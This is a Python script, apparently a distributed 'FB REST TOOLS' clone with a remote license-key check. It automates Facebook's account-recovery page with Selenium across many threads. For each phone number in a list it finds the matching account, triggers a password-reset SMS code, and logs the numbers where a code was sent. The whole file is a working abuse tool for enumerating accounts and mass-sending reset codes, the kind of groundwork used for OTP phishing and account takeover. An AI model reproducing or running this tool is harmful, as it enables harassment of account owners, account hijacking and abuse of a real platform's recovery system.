# ================== IMPORTS 1 ==================
import time
import random
import os
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from colorama import Fore, Style, init
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

init(autoreset=True)

# ================== GITHUB CONFIG ==================
# আপনার GitHub-এর Raw ফাইল লিঙ্কটি নিচের কোটেশনের ভেতরে দিন
ADMIN_KEY_URL = "https://raw.githubusercontent.com/xmlcreator320-cpu/AKASH-FB/main/keys.txt"

# ================== KEY SYSTEM ==================
# ইউজারের ডিভাইসে একটি স্থায়ী আইডি তৈরি করবে যা আর বদলাবে না
KEY_FILE = os.path.join(os.path.expanduser("~"), ".akash_permanent_key.txt")

def get_unique_id():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            return f.read().strip()
    else:
        # ইউনিক আইডি জেনারেট করা
        new_id = "AKASH-" + str(uuid.uuid4().hex[:6]).upper()
        with open(KEY_FILE, "w") as f:
            f.write(new_id)
        return new_id

def check_key():
    user_id = get_unique_id()
    banner() # কী সিস্টেমের সময় ব্যানার দেখানোর জন্য
    print(f"{Fore.WHITE} YOUR KEY : {Fore.YELLOW}{user_id}")
    print(f"{Fore.CYAN} STATUS   : {Fore.YELLOW}Checking Approval...")
    print(f"{Fore.WHITE}=" * 60)
    
    try:
        # গিটহাব থেকে কী চেক করা
        response = requests.get(f"{ADMIN_KEY_URL}?t={time.time()}", timeout=10)
        if response.status_code == 200:
            if user_id in response.text:
                print(f"{Fore.GREEN} [✓] ACCESS GRANTED! WELCOME AKASH.")
                time.sleep(2)
                return True
            else:
                print(f"{Fore.RED} [×] STATUS: NOT ACTIVE")
                print(f"{Fore.WHITE} Contact Admin: @akash_bosss")
                input(f"\n{Fore.RED} Press Enter to Exit...")
                exit()
        else:
            print(f"{Fore.RED} [!] Server Error! Check Internet Connection.")
            exit()
    except Exception:
        print(f"{Fore.RED} [!] Error: Cannot connect to server.")
        exit()

# ================== GLOBALS 2 ==================
stats = {
    "total": 0,
    "success": 0,
    "no_id": 0,
    "no_sms": 0,
    "error": 0
}
lock = Lock()
HEADLESS = False

# ================== BANNER 3 ==================
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.RED + Style.BRIGHT + r"""
  █████╗ ██╗  ██╗ █████╗ ███████╗██╗  ██╗
 ██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██║  ██║
 ███████║█████╔╝ ███████║███████╗███████║
 ██╔══██║██╔═██╗ ██╔══██║╚════██║██╔══██║
 ██║  ██║██║  ██╗██║  ██╗███████║██║  ██║
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """)

    print(Fore.MAGENTA + Style.BRIGHT + "        >>> FB REST TOOLS v1.0 AKASH CLONE <<<")
    print(Fore.CYAN + "=" * 60)
    print(Fore.YELLOW + Style.BRIGHT + " Developer : AKASH | TELEGRAM : @akash_bosss")
    print(Fore.CYAN + "=" * 60)
    print(Fore.WHITE + Style.BRIGHT + " [ LIVE REPORT ]")
    print(
        f" {Fore.BLUE}Total: {stats['total']} | "
        f"{Fore.GREEN}Sent: {stats['success']} | "
        f"{Fore.RED}No ID: {stats['no_id']}"
    )
    print(
        f" {Fore.YELLOW}No SMS: {stats['no_sms']} | "
        f"{Fore.MAGENTA}Error: {stats['error']}"
    )
    print(Fore.CYAN + "=" * 60 + "\n")

# ================== HELPERS 4 ==================
def load_data(filename):
    if not os.path.exists(filename):
        return []
    with open(filename, "r", encoding="utf-8") as f:
        return [x.strip() for x in f if x.strip()]

# ================== SELENIUM SETUP 5 ==================
def setup_chrome():
    options = Options()
    if HEADLESS:
        options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-software-rasterizer")

    if os.name == "nt" or (os.name == "posix" and not os.path.exists("/data/data/com.termux")):
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    else:
        options.binary_location = "/data/data/com.termux/files/usr/bin/chromium"
        driver = webdriver.Chrome(service=Service("/data/data/com.termux/files/usr/bin/chromedriver"), options=options)
    return driver

# ================== CORE PROCESS 6 ==================
log_count = 0
def log_event(msg, color=Fore.WHITE):
    global log_count
    with lock:
        log_count += 1
        print(f"{color}[{log_count}] {msg}{Style.RESET_ALL}")

def process_number(any_number):
    driver = None
    try:
        driver = setup_chrome()
        driver.get("https://www.facebook.com/recover/initiate/")

        input_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Email address or mobile number']"))
        )
        input_field.clear()
        input_field.send_keys(any_number)

        search_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Search')]"))
        )
        search_button.click()
        time.sleep(3)
        log_event(f"{any_number} : Processing", Fore.YELLOW)

        page_text = driver.page_source

        if "These accounts matched your search" in page_text or "This is my account" in page_text:
            try:
                first_account_btn = WebDriverWait(driver, 30).until(
                    EC.visibility_of_element_located((By.XPATH, "//*[normalize-space(text())='This is my account']"))
                )
                first_account_btn.click()
                time.sleep(3)
                page_text = driver.page_source
            except: pass

        if "No search results" in page_text:
            log_event(f"{any_number} : Invalid Account", Fore.RED)
            with lock: stats["no_id"] += 1
        elif any(x in page_text for x in ["Send code via SMS", "We can send a login code to:", "Try another way"]):
            try:
                try:
                    try_another_btn = driver.find_element(By.XPATH, "//a[contains(text(),'Try another way')]")
                    driver.execute_script("arguments[0].click();", try_another_btn)
                    time.sleep(1)
                except: pass

                sms_option = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, "//label[contains(.,'Send code via SMS')]//input"))
                )
                if not sms_option.is_selected():
                    driver.execute_script("arguments[0].click();", sms_option)

                continue_btn = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, "//button[contains(.,'Continue')]"))
                )
                driver.execute_script("arguments[0].click();", continue_btn)
                time.sleep(3)
                if "Please check your phone for a text message" in driver.page_source or "Your code is" in driver.page_source:
                    with lock: stats["success"] += 1
                    with open("success_sent.txt", "a", encoding="utf-8") as f: f.write(any_number + "\n")
                    log_event(f"{any_number} :Success", Fore.GREEN)
                else:
                    with lock: stats["no_sms"] += 1
            except:
                with lock: stats["error"] += 1
        elif "Enter security code" in page_text:
            with lock: stats["success"] += 1
            with open("success_sent.txt", "a", encoding="utf-8") as f: f.write(any_number + "\n")
            log_event(f"{any_number} : Already in OTP step", Fore.GREEN)
        else:
            with lock: stats["error"] += 1
    except:
        with lock: stats["error"] += 1
    finally:
        if driver:
            try: driver.quit()
            except: pass

# ================== MAIN 7 ==================
def main():
    check_key() # কী চেক কল করা হয়েছে
    banner()
    numbers = load_data("numbers.txt")
    if not numbers:
        print(Fore.RED + "numbers.txt ফাঁকা বা নেই!")
        return

    stats["total"] = len(numbers)
    try:
        threads = int(input(Fore.WHITE + "Enter Threads (5-10): "))
        threads = max(1, min(threads, 10))
    except:
        threads = 3

    global HEADLESS
    choice = input("ENTER{y} (y/n): ").lower()
    HEADLESS = True if choice == "y" else False

    print(Fore.CYAN + "\nStarting...\n")
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for num in numbers:
            executor.submit(process_number, num)

    time.sleep(2)
    banner()
    end_time = time.time()
    elapsed = end_time - start_time
    print(Fore.CYAN + "=" * 60)
    print(Fore.GREEN + Style.BRIGHT + f"ALL CLEAR | Time Taken: {int(elapsed)}s")
    print(Fore.CYAN + "=" * 60)
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Fatal Error: {e}")
    input("\nPress Enter to exit...")
